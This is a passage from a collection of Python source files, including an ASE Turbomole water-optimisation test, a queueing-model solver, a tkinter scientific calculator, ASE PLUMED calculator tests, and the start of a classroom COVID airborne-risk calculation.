[], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n", "155": "# type: ignore\nimport numpy as np\nfrom ase.calculators.turbomole import Turbomole\nfrom ase.build import molecule\n\n\ndef test_turbomole_h2o():\n    mol = molecule('H2O')\n\n    params = {\n        'title': 'water',\n        'task': 'geometry optimization',\n        'use redundant internals': True,\n        'basis set name': 'def2-SV(P)',\n        'total charge': 0,\n        'multiplicity': 1,\n        'use dft': True,\n        'density functional': 'b3-lyp',\n        'use resolution of identity': True,\n        'ri memory': 1000,\n        'force convergence': 0.001,\n        'geometry optimization iterations': 50,\n        'scf iterations': 100\n    }\n\n    calc = Turbomole(**params)\n    mol.calc = calc\n    calc.calculate(mol)\n    assert calc.converged\n\n    # use the get_property() method\n    energy = calc.get_property('energy', mol, False)\n    assert energy is not False\n    assert np.isclose(energy, -2076.286138, atol=1e-5)\n    forces = calc.get_property('forces', mol, False)\n    assert forces is not False\n    assert np.linalg.norm(forces) < 0.01\n    dipole = np.linalg.norm(calc.get_property('dipole', mol, False))\n    assert np.isclose(dipole, 0.448, rtol=0.01)\n\n    # use the get_results() method\n    results = calc.get_results()\n    print(results['molecular orbitals'])\n\n    # use the __getitem__() method\n    print(calc['results']['molecular orbitals'])\n    print(calc['results']['geometry optimization history'])\n\n    # perform a normal mode calculation with the optimized structure\n\n    params.update({\n        'task': 'normal mode analysis',\n        'density convergence': 1.0e-7\n    })\n\n    calc = Turbomole(**params)\n    mol.calc = calc\n    calc.calculate(mol)\n\n    spectrum = calc['results']['vibrational spectrum']\n    freq_ref = [0, 0, 0, 0, 0, 0, 1633, 3637, 3745]\n    for s in spectrum:\n        for freq, mode in zip(freq_ref, range(1, 7)):\n            if s['mode number'] == mode:\n                assert np.isclose(s['frequency']['value'], freq, rtol=0.05)\n\n    print(calc.todict(skip_default=False))\n", "156": "import math\n\n\nclass Derivative:\n    def __init__(self, f, h=0.0001):\n        self.f = f\n        self.h = float(h)\n\n    def __call__(self, x):\n        f, h = self.f, self.h\n        return (f(x+h) - f(x-h))/(2*h)\n\nclass Derivative12:\n    def __init__(self, f, h=0.0001):\n        self.f = f\n        self.h = float(h)\n\n    def __call__(self, x, m):\n        f, h = self.f, self.h\n        return (f(x+h,m) - f(x-h,m))/(2*h)\n\n\ndef C(n, k):\n    return math.factorial(n)/(math.factorial(n-k)*math.factorial(k))\n\ndef b(value):\n    res = [0]\n    summ = 0\n    for i in range(1, value):\n        summ += i\n    for i in range(1, value):\n        res.append(i/summ)\n    return res\n\n\nclass Solver:\n\n    def __init__(self, a, infin=3, fun = b):\n        assert 0 < a < 1\n        self.a = a\n        self.inf = infin\n        self.b = fun(self.inf)\n        self.inA = 1 - a\n        self.inB = self.calc_inB()\n        self.pk = {}\n        self.pik = {}\n        self.gk = {}\n        self.vk = {}\n        assert self.calc_beta(self.inA)>self.inA/(1+self.inA)\n\n    def calc_inB(self):\n        sum = 0\n        for i in range(self.inf):\n            sum+=i*self.b[i]\n        return sum\n\n    def calc_Bi(self, i):\n        sum = 0\n        for j in range(i, self.inf):\n            sum += self.b[j]\n        return sum\n\n    def calc_beta(self, z):\n        sum = 0\n        for i in range(self.inf):\n            sum += z**i*self.b[i]\n        return sum\n\n    def calc_pk(self, k):\n        if self.pk.get(k) or self.pk.get(k)==0:\n            return self.pk[k]\n        else:\n            if k==0:\n                self.pk[k] = 1 - (self.inA*(1-self.calc_beta(self.inA))/self.calc_beta(self.inA))\n            elif k==1:\n                self.pk[k] = (1/self.calc_beta(self.inA)*(1-self.calc_beta(self.inA)))*self.calc_pk(0)\n            else:\n                self.pk[k] = (1/self.calc_beta(self.inA))*(1-self.calc_beta(self.inA))*(self.calc_pk(k-1)-self.calc_pik(1, k-1))\n            return self.pk[k]\n\n    def calc_pik(self, i, k):\n        assert k>=1\n        if self.pik.get((i, k)) or self.pik.get((i, k))==0:\n            return self.pik[(i, k)]\n        else:\n            if i==1 and k==1:\n                self.pik[(i, k)] = self.a/self.inA*self.calc_pk(0)\n            elif i==1:\n                self.pik[(i, k)] = self.a/self.inA*(self.calc_pk(k-1) - self.calc_pik(1, k-1))\n            elif k==1:\n                sum = 0\n                for j in range(i, self.inf):\n                    sum+=self.inA**(j-i)*self.b[j]\n                self.pik[(i, k)] = self.a*(self.calc_pk(0)+self.calc_pk(1))*sum\n            else:\n                sum = 0\n                for j in range(i, self.inf):\n                    sum += self.inA**(j-i)*self.b[j]\n                self.pik[(i, k)] = self.a*(self.calc_pk(k-1)-self.calc_pik(1, k-1))*sum+self.a*self.calc_pk(k)*sum\n            return self.pik[(i, k)]\n\n    def calc_gk(self, k):\n        if self.gk.get(k) or self.gk.get(k)==0:\n            return self.gk[k]\n        else:\n            if k==0:\n                self.gk[k] = 0\n            else:\n                sum1, sum2 = 0, 0\n                for i in range(1, k+1):\n                    sum1 += self.inA**(i-1)*self.a*self.b[i]*self.calc_gk(k-i)\n                    sum3 = 0\n                    for j in range(k-i+1):\n                        sum3 += self.calc_gk(j)*self.calc_gk(k-i-j)\n                    sum2 += self.inA**(i-1)*self.a*self.calc_Bi(i+1)*sum3\n                self.gk[k] = self.inA**k*self.b[k] + sum1 + sum2\n            return self.gk[k]\n\n    def calc_vk(self, k):\n        if self.vk.get(k) or self.vk.get(k)==0:\n            return self.vk[k]\n        else:\n            if k==0:\n                self.vk[k] = 0\n            else:\n                sum1 = 0\n                for i in range(1,k+1):\n                    sum2 = 0\n                    for j in range(k-i+1):\n                        sum2 += self.calc_gk(j)*self.calc_vk(k-i-j)\n                    sum1 += self.inA**(i-1)*self.a*self.calc_Bi(i+1)*sum2\n                self.vk[k] = self.inA**(k-1)*self.b[k]+sum1\n            return self.vk[k]\n\n    def calc_vkm(self, k, m):\n        if k==0:\n            return 0\n        elif k >= 1 and k <= m-1:\n            sum1 = 0\n            for i in range(1,k+1):\n                sum2 = 0\n                for j in range(0, k-i+1):\n                    sum2 += self.calc_gk(j)*self.calc_vk(k-i-j)\n                sum1 += self.inA**(i-1)*self.a*sum2\n            return sum1\n        else:\n            sum1 = 0\n            for i in range(1, m):\n                sum2 = 0\n                for j in range(0,k-i+1):\n                    sum2 += self.calc_gk(j)*self.calc_vk(k-i-j)\n                sum1 += self.inA**(i-1)*self.a*sum2\n            return self.inA**(m-1) + sum1\n\n    def calc_N(self):\n        sum1 = 0\n        for i in range(1, self.inf):\n            sum2 = 0\n            for k in range(1, self.inf):\n                sum2 += k*self.calc_pik(i, k)\n            sum1 += sum2\n        return sum1\n\n    def calc_gamma(self, z):\n        sqr = math.sqrt((1-self.inA*z)**2*(self.inA-self.a*self.calc_beta(self.inA*z))**2 \\\n                        - 4*self.a*(self.inA*z-self.calc_beta(self.inA*z))*self.inA*(1-self.inA*z)*self.calc_beta(self.inA*z))\n        return ((1-self.inA*z)*(self.inA-self.a*self.calc_beta(self.inA*z)) - sqr)/(2*self.a*(self.inA*z-self.calc_beta(self.inA*z)))\n\n    def calc_ing1(self):\n        df = Derivative(self.calc_gamma)\n        return df(1)\n\n    def calc_ing2(self):\n        summ=0\n        for k in range(self.inf):\n            summ += k*self.calc_gk(k)\n        return summ\n\n    def calc_vz(self, z):\n        return ((1-self.inA*z)*self.calc_beta(self.inA*z))/\\\n               (self.inA*(1-self.inA*z) - self.a*(self.inA*z - self.calc_beta(self.inA*z))*self.calc_gamma(z))\n\n    def calc_v1(self):\n        df = Derivative(self.calc_vz)\n        return df(1)\n\n    def calc_v2(self):\n        summ = 0\n        for i in range(self.inf):\n            summ += i* self.calc_vk(i)\n        return summ\n\n    def calc_vzm(self, z, m):\n        return ((self.inA*z)**m/self.inA)+(self.a*z/self.inA) *\\\n                                          (1-(self.inA*z)**(m-1))*self.calc_gamma(z)*self.calc_vz(z) /\\\n                                          (1-self.inA*z)\n\n    def calc_vhatm1(self, m):\n        df = Derivative12(self.calc_vzm)\n        return df(1, m)\n\n    def calc_vhatm2(self, m):\n        summ = 0\n        for i in range(self.inf):\n            summ += i*self.calc_vkm(i, m)\n        return summ", "157": "'''Scientific Calculator by Rajiv Ranjan'''\n# Import tkinter packages\nfrom tkinter import *\nimport math\nimport numpy as np\n\n# ******************Functions*****************\n\n# Function to add in the entry of text display\ndef button_click(char):\n    global calc_operator\n    calc_operator += str(char)\n    text_input.set(calc_operator)\n\n# Function to clear the whole entry of text display\ndef button_clear_all():\n    global calc_operator\n    calc_operator = \"\"\n    text_input.set(\"\")\n\n# Function to clear the input one by one from the text display\ndef button_delete():\n    global calc_operator\n    text = calc_operator[:-1]\n    calc_operator = text\n    text_input.set(text)\n\n# Recursive Function to calculate the factorial of a number\ndef factorial(n):\n    if n==0 or n==1:\n        return 1\n    else:\n        return n*factorial(n-1)\n\ndef fact_func():\n    global calc_operator\n    result = str(factorial(int(calc_operator)))\n    calc_operator = result\n    text_input.set(result)\n\n# Function to calculate trigonometric numbers of an angle\n\n# sine function\ndef trig_sin():\n    global calc_operator\n    # calc_operator = result\n    res=(int(calc_operator))\n    if (res==90):\n        text_input.set(\"1.0\")\n    else:\n        result = str(math.sin(math.radians(int(calc_operator))))\n        text_input.set(result)\n\n# cosine function\ndef trig_cos():\n    global calc_operator\n    # calc_operator = result\n    res=(int(calc_operator))\n    if (res==90):\n        text_input.set(\"0\")\n    else:\n        result = str(math.cos(math.radians(int(calc_operator))))\n        text_input.set(result)\n\n# tangent function\ndef trig_tan():\n    global calc_operator\n    # calc_operator = result\n    res=(int(calc_operator))\n    if (res==90):\n        text_input.set(\"NOT DEFINED\")\n    elif(res==0):\n        text_input.set(\"0\")\n    elif(res==45):\n        text_input.set(\"1.0\")    \n    else:\n        result = str(math.tan(math.radians(int(calc_operator))))\n        text_input.set(result)\n\n# cot function\ndef trig_cot():\n    global calc_operator\n    # calc_operator = result\n    res=(int(calc_operator))\n    if (res==90):\n        text_input.set(\"0\")\n    elif(res==0):\n        text_input.set(\"NOT DEFINED\")\n    elif(res==45):\n        text_input.set(\"1.0\")    \n    else:\n        result = str(1/math.tan(math.radians(int(calc_operator))))\n        text_input.set(result)\n\n# Function to find the square root of a number\ndef square_root():\n    global calc_operator\n    if int(calc_operator)>=0:\n        temp = str(eval(calc_operator+'**(1/2)'))\n        calc_operator = temp\n    else:\n        temp = \"ERROR\"\n    text_input.set(temp)\n\n# Function to find the third root of a number\ndef third_root():\n    global calc_operator\n    if int(calc_operator)>=0:\n        temp = str(eval(calc_operator+'**(1/3)'))\n        calc_operator = temp\n    else:\n        temp = \"MATH ERROR\"\n    text_input.set(temp)\n\n# Function to change the sign of number\ndef sign_change():\n    global calc_operator\n    if calc_operator[0]=='-':\n        temp = calc_operator[1:]\n    else:\n        temp = '-'+calc_operator\n    calc_operator = temp\n    text_input.set(temp)    \n\n# Function to calculate the percentage of a number\ndef percent():\n    global calc_operator\n    temp = str(eval(calc_operator+'/100'))\n    calc_operator = temp\n    text_input.set(temp)\n\n# Funtion to find the result of an operation\ndef button_equal():\n    global calc_operator\n    temp_op = str(eval(calc_operator))\n    text_input.set(temp_op)\n    calc_operator = temp_op\n\n'''\nVariables\n'''\nsin, cos, tan = math.sin, math.cos, math.tan\nlog, ln = math.log10, math.log\ne = math.exp\np = math.pi\nE = '*10**'\n\n# ****** Display ******\ntk_calc = Tk()\ntk_calc.configure(bg=\"#181D31\", bd=20)\ntk_calc.title(\"Scientific Calculator\")\n\n\n\ncalc_operator = \"\"\ntext_input = StringVar()\n\ntext_display = Entry(tk_calc, font=('times new roman', 18, 'bold'), textvariable=text_input,\n                     bd=5, insertwidth = 5, bg='white', justify='right').grid(columnspan=5, padx = 10, pady = 15)\n\nbutton_params = {'bd':5, 'fg':'#BBB', 'bg':'#3C3636', 'font':('sans-serif', 20, 'bold')}\nbutton_params_main = {'bd':5, 'fg':'#000', 'bg':'#BBB', 'font':('sans-serif', 20, 'bold')}\n\n'''\nButtons\n'''\n#--1st row--\n# Absolute value of a number\nabs_value = Button(tk_calc, button_params, text='abs',\n                   command=lambda:button_click('abs(')).grid(row=1, column=0, sticky=\"nsew\")\n# Remainder of a division\nmodulo = Button(tk_calc, button_params, text='mod',\n                command=lambda:button_click('%')).grid(row=1, column=1, sticky=\"nsew\")\n# Integer division quotient\nint_div = Button(tk_calc, button_params, text='div',\n                 command=lambda:button_click('//')).grid(row=1, column=2, sticky=\"nsew\")\n# Factorial of a number\nfactorial_button = Button(tk_calc, button_params, text='x!',\n                   command=fact_func).grid(row=1, column=3, sticky=\"nsew\")\n# Euler's number e\neulers_num = Button(tk_calc, button_params, text='e',\n                    command=lambda:button_click(str(math.exp(1)))).grid(row=1, column=4, sticky=\"nsew\")\n\n#--2nd row--\n# Sine of an angle in degrees\nsine = Button(tk_calc, button_params, text='sin',\n             command=trig_sin).grid(row=2, column=0, sticky=\"nsew\")\n# Cosine of an angle in degrees\ncosine = Button(tk_calc, button_params, text='cos',\n             command=trig_cos).grid(row=2, column=1, sticky=\"nsew\")\n# Tangent of an angle in degrees\ntangent = Button(tk_calc, button_params, text='tan',\n             command=trig_tan).grid(row=2, column=2, sticky=\"nsew\")\n# Cotangent of an angle in degrees\ncotangent = Button(tk_calc, button_params, text='cot',\n             command=trig_cot).grid(row=2, column=3, sticky=\"nsew\")\n# Pi(3.14...) number \npi_num = Button(tk_calc, button_params, text='\u00cf\u20ac',\n                command=lambda:button_click(str(math.pi))).grid(row=2, column=4, sticky=\"nsew\")\n\n#--3rd row--\n# Power of 2\nsecond_power = Button(tk_calc, button_params, text='x\\u00B2',\n             command=lambda:button_click('**2')).grid(row=3, column=0, sticky=\"nsew\")\n# Power of 3\nthird_power = Button(tk_calc, button_params, text='x\\u00B3',\n             command=lambda:button_click('**3')).grid(row=3, column=1, sticky=\"nsew\")\n# Power of n\nnth_power = Button(tk_calc, button_params, text='x^n',\n             command=lambda:button_click('**')).grid(row=3, column=2, sticky=\"nsew\")\n# Inverse number\ninv_power = Button(tk_calc, button_params, text='x\\u207b\\xb9',\n             command=lambda:button_click('**(-1)')).grid(row=3, column=3, sticky=\"nsew\")\n# Powers of 10\ntens_powers = Button(tk_calc, button_params, text='10^x', font=('sans-serif', 15, 'bold'),\n                     command=lambda:button_click('10**')).grid(row=3, column=4, sticky=\"nsew\")\n\n#--4th row--\n# Square root of a number\nsquare_root = Button(tk_calc, button_params, text='\\u00B2\\u221A',\n                     command=square_root).grid(row=4, column=0, sticky=\"nsew\")\n# Third root of a number\nthird_root = Button(tk_calc, button_params, text='\\u00B3\\u221A',\n                    command=third_root).grid(row=4, column=1, sticky=\"nsew\")\n# nth root of a number\nnth_root = Button(tk_calc, button_params, text='\\u221A',\n                  command=lambda:button_click('**(1/')).grid(row=4, column=2, sticky=\"nsew\")\n# Logarithm of a number with base 10\nlog_base10 = Button(tk_calc, button_params, text='log\\u2081\\u2080', font=('sans-serif', 16, 'bold'),\n                   command=lambda:button_click('log(')).grid(row=4, column=3, sticky=\"nsew\")\n# Logarithm of a number with base e (ln)\nlog_basee = Button(tk_calc, button_params, text='ln',\n                   command=lambda:button_click('ln(')).grid(row=4, column=4, sticky=\"nsew\")\n\n#--5th row--\n# Add a left parentheses\nleft_par = Button(tk_calc, button_params, text='(',\n                  command=lambda:button_click('(')).grid(row=5, column=0, sticky=\"nsew\")\n# Add a right parentheses\nright_par = Button(tk_calc, button_params, text=')',\n                   command=lambda:button_click(')')).grid(row=5, column=1, sticky=\"nsew\")   \n# Change the sign of a number\nsigns = Button(tk_calc, button_params, text='\\u00B1',\n               command=sign_change).grid(row=5, column=2, sticky=\"nsew\")\n# Transform number to percentage\npercentage = Button(tk_calc, button_params, text='%',\n               command=percent).grid(row=5, column=3, sticky=\"nsew\")\n# Calculate the function e^x\nex = Button(tk_calc, button_params, text='e^x',\n               command=lambda:button_click('e(')).grid(row=5, column=4, sticky=\"nsew\")\n\n#--6th row--\nbutton_7 = Button(tk_calc, button_params_main, text='7',\n                  command=lambda:button_click('7')).grid(row=6, column=0, sticky=\"nsew\")\nbutton_8 = Button(tk_calc, button_params_main, text='8',\n                  command=lambda:button_click('8')).grid(row=6, column=1, sticky=\"nsew\")\nbutton_9 = Button(tk_calc, button_params_main, text='9',\n                  command=lambda:button_click('9')).grid(row=6, column=2, sticky=\"nsew\")\ndelete_one = Button(tk_calc, bd=5, fg='#000', font=('sans-serif', 20, 'bold'),\n              text='DEL', command=button_delete, bg='red').grid(row=6, column=3, sticky=\"nsew\")\ndelete_all = Button(tk_calc, bd=5, fg='#000', font=('sans-serif', 20, 'bold'),\n              text='AC', command=button_clear_all, bg='#db701f').grid(row=6, column=4, sticky=\"nsew\")\n\n#--7th row--\nbutton_4 = Button(tk_calc, button_params_main, text='4',\n                  command=lambda:button_click('4')).grid(row=7, column=0, sticky=\"nsew\")\nbutton_5 = Button(tk_calc, button_params_main, text='5',\n                  command=lambda:button_click('5')).grid(row=7, column=1, sticky=\"nsew\")\nbutton_6 = Button(tk_calc, button_params_main, text='6',\n                  command=lambda:button_click('6')).grid(row=7, column=2, sticky=\"nsew\")\nmul = Button(tk_calc, button_params_main, text='*',\n             command=lambda:button_click('*')).grid(row=7, column=3, sticky=\"nsew\")\ndiv = Button(tk_calc, button_params_main, text='/',\n             command=lambda:button_click('/')).grid(row=7, column=4, sticky=\"nsew\")\n\n#--8th row--\nbutton_1 = Button(tk_calc, button_params_main, text='1',\n                  command=lambda:button_click('1')).grid(row=8, column=0, sticky=\"nsew\")\nbutton_2 = Button(tk_calc, button_params_main, text='2',\n                  command=lambda:button_click('2')).grid(row=8, column=1, sticky=\"nsew\")\nbutton_3 = Button(tk_calc, button_params_main, text='3',\n                  command=lambda:button_click('3')).grid(row=8, column=2, sticky=\"nsew\")\nadd = Button(tk_calc, button_params_main, text='+',\n             command=lambda:button_click('+')).grid(row=8, column=3, sticky=\"nsew\")\nsub = Button(tk_calc, button_params_main, text='-',\n             command=lambda:button_click('-')).grid(row=8, column=4, sticky=\"nsew\")\n\n#--9th row--\nbutton_0 = Button(tk_calc, button_params_main, text='0',\n                  command=lambda:button_click('0')).grid(row=9, column=0, sticky=\"nsew\")\npoint = Button(tk_calc, button_params_main, text='.',\n               command=lambda:button_click('.')).grid(row=9, column=1, sticky=\"nsew\")\nexp = Button(tk_calc, button_params_main, text='EXP', font=('sans-serif', 16, 'bold'),\n             command=lambda:button_click(E)).grid(row=9, column=2, sticky=\"nsew\")\nequal = Button(tk_calc, button_params_main, text='=',\n               command=button_equal).grid(row=9, columnspan=2, column=3, sticky=\"nsew\")\n\n\ntk_calc.mainloop()\n", "158": "from ase import Atoms\nfrom ase.calculators.emt import EMT\nfrom ase.calculators.idealgas import IdealGas\nfrom ase.md.verlet import VelocityVerlet\nfrom ase.calculators.lj import LennardJones\nimport numpy as np\nfrom ase.io.trajectory import Trajectory\nfrom pytest import approx\nimport pytest\nfrom ase.calculators.plumed import restart_from_trajectory\nfrom ase import units\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator('plumed')\ndef test_units(factory):\n    \"\"\"\n    Note: if this test fails, plumed or ASE changed some units.\n    It has to be fixed in the contructor of the plumed calculator.\n\n    In this test is considered two atoms interacting through a potential with\n    the form:\n\n    (lower wall in plumed setup)\n    V = k (r - r0)^2\n\n    The values are fixed as follow:\n\n    time = 1 ASE time units\n    k = 1 kJ/(mol*nm^2)\n    r = 1 Angstrom\n    r0 = 1.1 nm\n\n    considering r in nm, V = 1 kJ/mol and the forces F(r) = 2 kJ/(mol*nm) \"\"\"\n\n    set_plumed = [\"e: ENERGY\",                         # check energy units\n                  \"d: DISTANCE ATOMS=1,2\",             # check distance units\n                  \"LOWER_WALLS ARG=d AT=1.1 KAPPA=1\",  # check forces recieved\n                  \"DUMPMASSCHARGE FILE=mass_charge\",   # check mass and charges\n                  \"PRINT ARG=e,d FILE=COLVAR\",\n                  \"FLUSH STRIDE=1\"]\n\n    # execution\n    atoms = Atoms('CO', positions=[[0, 0, 0], [0, 0, 1]], charges=[0, 1])\n\n    timestep = 1\n    calc = IdealGas()\n    with factory.calc(calc=calc,\n                      input=set_plumed,\n                      timestep=timestep,\n                      atoms=atoms,\n                      use_charge=True) as calc:\n        ener, forces = atoms.calc.compute_bias(atoms.get_positions(), 1,\n                                               atoms.get_potential_energy())\n        files = calc.read_plumed_files()\n\n    # the next values are in ase units\n    ase_values = {'time': 1,\n                  'energy': ener,\n                  'distance': 1,\n                  'masses': atoms.get_masses(),\n                  'charges': atoms.get_initial_charges(),\n                  'forces': forces}\n\n    # The next values are in plumed units.\n    plumed_values = {'time': files['COLVAR'][0][-1],\n                     'energy': files['COLVAR'][1][-1],\n                     'distance': files['COLVAR'][2][-1],\n                     'masses': files['mass_charge'][1],\n                     'charges': files['mass_charge'][2],\n                     'forces': np.array([[0, 0, -2], [0, 0, 2]])}\n\n    assert ase_values['time'] * 1 / (1000 * units.fs) == \\\n        approx(plumed_values['time'], abs=1E-5), \\\n        \"error in time units\"\n    assert ase_values['energy'] * units.mol / units.kJ == \\\n        approx(plumed_values['energy'], abs=1E-5), \\\n        \"error in energy units\"\n    assert ase_values['distance'] * 1 / units.nm == \\\n        approx(plumed_values['distance'], abs=1E-5), \\\n        \"error in distance units\"\n    assert ase_values['forces'] * units.nm * units.mol / units.kJ == \\\n        approx(plumed_values['forces'], abs=1E-5), \\\n        \"error in forces units\"\n    assert ase_values['masses'] == approx(plumed_values['masses'],\n                                          abs=1E-5),\\\n        \"error in masses units\"\n    assert ase_values['charges'] == approx(plumed_values['charges'],\n                                           abs=1E-5),\\\n        \"error in charges units\"\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator('plumed')\ndef test_CVs(factory):\n    \"\"\" This test calls plumed-ASE calculator for computing some CVs.\n    Moreover, it computes those CVs directly from atoms.positions and\n    compares them\"\"\"\n    # plumed setting\n    ps = 1000 * units.fs\n    set_plumed = [f\"UNITS LENGTH=A TIME={1/ps} ENERGY={units.mol/units.kJ}\",\n                  \"c1: COM ATOMS=1,2\",\n                  \"c2: CENTER ATOMS=1,2\",\n                  \"l: DISTANCE ATOMS=c1,c2\",\n                  \"d: DISTANCE ATOMS=1,2\",\n                  \"c: COORDINATION GROUPA=1 GROUPB=2 R_0=100 MM=0 NN=10\",\n                  \"FLUSH STRIDE=1\",\n                  \"PRINT ARG=d,c,l STRIDE=10 FILE=COLVAR_test1\"]\n\n    # execution\n    atoms = Atoms('CO', positions=[[0, 0, 0], [0, 0, 5]])  # CO molecule\n    _, colvar = run(factory, [set_plumed, atoms, 5], calc=EMT(), steps=101)\n\n    # this compares the time calculated by ASE and plumed\n    timeASE = np.arange(0., 501., 50)\n    timePlumed = colvar['COLVAR_test1'][0]\n    assert timeASE == approx(timePlumed), \"Error in time registered by plumed\"\n\n    # This compares the distance of atoms calculated by ASE and plumed\n    distASE = np.array([5., 51.338332, 141.252854, 231.167376, 321.081899,\n                        410.996421, 500.910943, 590.825465, 680.739987,\n                        770.654509, 860.569031])\n    distPlumed = colvar['COLVAR_test1'][1]\n    assert distPlumed == approx(distASE), \"Error in distance\"\n\n    # this compares the coordination number calculated by ASE and plumed\n    CASE = np.array([1.0000e+00, 9.9873e-01, 3.0655e-02, 2.2900e-04,\n                     9.0000e-06, 1.0000e-06, 0.0000e+00, 0.0000e+00,\n                     0.0000e+00, 0.0000e+00, 0.0000e+00])\n    CPlumed = colvar['COLVAR_test1'][2]\n    assert CASE == approx(CPlumed, abs=1E-5), \"Error in coordination number\"\n\n    # this compares the distance between center of mass and geometrical center\n    # calculated by ASE and plumed\n    centersASE = np.array([0.355944, 3.654717, 10.05563, 16.456542, 22.857455,\n                           29.258367, 35.65928, 42.060192, 48.461104,\n                           54.862017, 61.262929])\n\n    centersPlumed = colvar['COLVAR_test1'][3]\n    assert centersASE == approx(centersPlumed)\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator('plumed')\ndef test_metadyn(factory):\n    \"\"\"This test computes a Metadynamics calculation,\n    This result is compared with the same calulation made externally\"\"\"\n    params = setups()\n    atoms, _ = run(factory, params, steps=58)\n\n    position1 = -0.0491871\n    position2 = 6.73693\n    forceWithBias = 0.28807\n\n    assert (atoms.get_positions()[0][0] == approx(position1, abs=0.01) and\n            atoms.get_positions()[1][0] == approx(position2, abs=0.01)), \\\n        \"Error in the metadynamics simulation\"\n    assert atoms.get_forces()[0][0] == approx(forceWithBias, abs=0.01), \\\n        \"Error in the computation of Bias-forces\"\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator('plumed')\ndef test_restart(factory):\n    ins = setups()\n    # first steps\n    _, res = run(factory, ins, name='restart')\n\n    # rest of steps with restart\n    input, atoms1, timestep = setups()\n    with restart_from_trajectory('test-restart.traj',\n                                 calc=LennardJones(epsilon=10, sigma=6),\n                                 input=input,\n                                 timestep=timestep,\n                                 atoms=atoms1) as atoms1.calc:\n        with VelocityVerlet(atoms1, timestep) as dyn:\n            dyn.run(30)\n\n    # Values computed externally\n    position1 = -0.0491871\n    position2 = 6.73693\n    forceWithBias = 0.28807\n\n    assert atoms1.get_forces()[0][0] == approx(forceWithBias, abs=0.01), \\\n        \"Error in restart for the computation of Bias-forces\"\n\n    assert (atoms1.get_positions()[0][0] == approx(position1, abs=0.01) and\n            atoms1.get_positions()[1][0] == approx(position2, abs=0.01)), \\\n        \"Error in the restart of metadynamics simulation\"\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator('plumed')\ndef test_postpro(factory):\n    # Metadynamics simulation\n    params = setups('direct')\n    _, direct = run(factory, params, name='direct', steps=58)\n\n    params = setups('postpro')\n    # Postpro resconstruction\n    with factory.calc(calc=IdealGas(),\n                      input=params[0],\n                      atoms=params[1],\n                      timestep=params[2]) as calc:\n        with Trajectory('test-direct.traj') as traj:\n            postpr = calc.write_plumed_files(traj)['HILLS_postpro']\n\n    assert postpr == approx(direct['HILLS_direct'])\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator('plumed')\ndef test_pbc(factory):\n    atoms = Atoms('H2')\n    atoms.set_positions([[1, 0, 0], [11, 2, 0]])\n\n    atoms.set_cell([[10, 0, 0], [10, 10, 0], [0, 0, 10]])\n    traj = [atoms]\n\n    ps = 1000 * units.fs\n    setup = [f\"UNITS LENGTH=A TIME={1/ps} ENERGY={units.mol/units.kJ}\",\n             \"d: DISTANCE ATOMS=1,2\",\n             \"PRINT ARG=d STRIDE=100 FILE=COLVAR_pbc\"]\n\n    with factory.calc(calc=IdealGas(),\n                      input=setup,\n                      atoms=atoms,\n                      timestep=1) as calc:\n        dist = calc.write_plumed_files(traj)['COLVAR_pbc']\n\n    assert dist[1] == 2., \"Error in PBC\"\n\n\ndef run(factory, inputs, name='',\n        calc=LennardJones(epsilon=10, sigma=6),\n        traj=None, steps=29):\n    input, atoms, timestep = inputs\n    with factory.calc(calc=calc,\n                      input=input,\n                      timestep=timestep,\n                      atoms=atoms) as atoms.calc:\n        with VelocityVerlet(atoms, timestep,\n                            trajectory='test-{}.traj'.format(name)) as dyn:\n            dyn.run(steps)\n        res = atoms.calc.read_plumed_files()\n    return atoms, res\n\n\ndef setups(name=''):\n    ps = 1000 * units.fs\n    set_plumed = [f\"UNITS LENGTH=A TIME={1/ps} ENERGY={units.mol/units.kJ}\",\n                  \"d: DISTANCE ATOMS=1,2\",\n                  \"FLUSH STRIDE=1\",\n                  f\"METAD ARG=d SIGMA=0.5 HEIGHT=2 PACE=20 FILE=HILLS_{name}\"]\n    atoms = Atoms('CO', positions=[[0, 0, 0], [6.7, 0, 0]])\n    timestep = 0.05\n    return set_plumed, atoms, timestep\n", "159": "import numpy as np\nimport pandas as pd\nimport math\nfrom getCountyCases import getCountyCases\nimport statistics\n\ne = math.e\n\n\ndef calculateAdvanced(numFaculty, numStudents, numSessions, durationSessions, classFloorArea, classHeight, county, state, masks, facultyInfectious, studentInfectious, maskEffExhalation, maskEffInhalation, ventilationRate, addlControl, decayRate, depositionRate, facultyInhalation, studentInhalation, meanFacultyQuantaE, sdFacultyQuantaE, meanStudentQuantaE, sdStudentQuantaE):\n    num_faculty = numFaculty\n    num_students = numStudents\n    num_class_periods = numSessions\n    duration = durationSessions/60\n    floor_area = classFloorArea\n    height = classHeight\n    volume = floor_area*height*(0.305**3)\n    county = county\n    state = state\n\n    ventilation_w_outside_air = [ventilationRate[0], ventilationRate[1], 1]\n    decay_rate_of_virus = [decayRate[0], decayRate[1], 1]\n    deposition_to_surface = [depositionRate[0], depositionRate[1], 1]\n    additional_control_measures = [addlControl[0], addlControl[1], 1]\n    quanta_emission_rate_faculty = [meanFacultyQuantaE, sdFacultyQuantaE, 1]\n    quanta_emission_rate_student = [meanStudentQuantaE, sdStudentQuantaE, 1]\n    exhalation_mask_efficiency = [maskEffExhalation[0]/100, maskEffExhalation[1]/100, 1]\n    inhalation_mask_efficiency = [maskEffInhalation[0]/100, maskEffInhalation[1]/100, 1]\n    inhalation_rate_faculty = [facultyInhalation[0], facultyInhalation[1], 1]\n    inhalation_rate_student = [studentInhalation[0], studentInhalation[1], 1]\n    percent_faculty_infectious = [facultyInfectious[0], facultyInfectious[1], 0]\n    percent_student_infectious = [studentInfectious[0], studentInfectious[1], 0]\n    # ventilation_w_outside_air = [1, 4, 1]\n    # decay_rate_of_virus = [0, 1.0, 1]\n    # deposition_to_surface = [0.3, 1.5, 1]\n    # additional_control_measures = [0, 0, 1]\n    # quanta_emission_rate_faculty = [1.5, 0.71, 1]\n    # quanta_emission_rate_student = [0.69, 0.71, 1]\n    # exhalation_mask_efficiency = [0.4, 0.6, 1]\n    # inhalation_mask_efficiency = [0.3, 0.5, 1]\n    # 